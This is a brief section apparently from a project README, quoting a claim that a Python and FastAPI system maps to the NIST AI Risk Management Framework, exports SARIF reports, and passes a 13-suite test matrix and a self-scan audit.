### 4. The Verification & Standards Alignment
> *"The system is implemented in Python using FastAPI, Pydantic v2, and SQLAlchemy. It is mapped to the NIST AI Risk Management Framework (AI RMF 1.0) across all four core functions (Govern, Map, Measure, Manage), exports SARIF v2.1.0 reports for CI/CD pipelines, and is verified by a 13-suite automated test matrix and a 100/100 self-scan audit."*
